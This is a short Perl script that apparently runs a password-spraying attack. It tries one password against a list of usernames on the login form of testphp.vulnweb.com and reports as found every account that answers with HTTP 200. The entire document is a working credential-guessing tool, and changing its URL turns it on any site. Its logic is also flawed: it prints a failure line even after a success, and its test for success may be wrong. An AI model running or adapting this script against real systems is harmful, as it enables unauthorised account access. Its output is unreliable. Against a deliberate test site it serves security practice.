#!/usr/bin/perl

use strict;
use warnings;
use v5.32;

use Getopt::Long qw(GetOptions);
use WWW::Mechanize ();

my ($users, $password);
my %command_line;
Getopt::Long::GetOptions('users=s'      => \$users,
			 'password=s'   => \$password )
    or die "error parsing options\n";

open my $users_fh, '<', $users or die "Cannot open  '$users': $!\n" ;
my $mech = WWW::Mechanize->new(autocheck => 1);
my @found_users; 
while (my $user = <$users_fh>) {
    
    chomp $user;
    $mech->get("http://testphp.vulnweb.com/login.php");
    $mech->max_redirect(0);
    $mech->submit_form(
	form_number => 1,
	with_fields => {
	    uname => $user,
	    pass => $password,
	    
	   }
	
	);
    my $status  = $mech->status;
    if($mech->status()  == 200) {
	say "Login Succesfull: user:$user, password: $password Code=$status";
	push @found_users, $user;
    }
    say "Login Failed: $user:$password, Status Code=$status";
	
}

say "credential found: user=$_  password=$password" foreach @found_users;
